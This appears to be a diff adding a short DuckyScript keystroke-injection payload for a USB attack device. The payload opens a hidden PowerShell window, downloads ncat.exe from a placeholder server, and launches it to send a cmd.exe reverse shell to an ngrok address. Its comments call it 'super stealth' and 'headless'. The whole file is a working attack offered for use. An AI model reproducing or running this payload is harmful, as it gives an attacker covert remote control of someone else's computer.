@@ -1,0 +1,7 @@
+REM This will download netcat from your hosted/saved server(update details in line 6). Then install it and send a reverse shell back(update details in line 6). ALL HEADLESS.
+REM Super stealth ncat reverse shell via PowerShell
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -w hidden -c "Invoke-WebRequest -Uri 'http://yourhost.com/ncat.exe' -OutFile $env:temp\ncat.exe; Start-Process $env:temp\ncat.exe -ArgumentList '0.tcp.ngrok.io 1248 -e cmd.exe'"
+ENTER
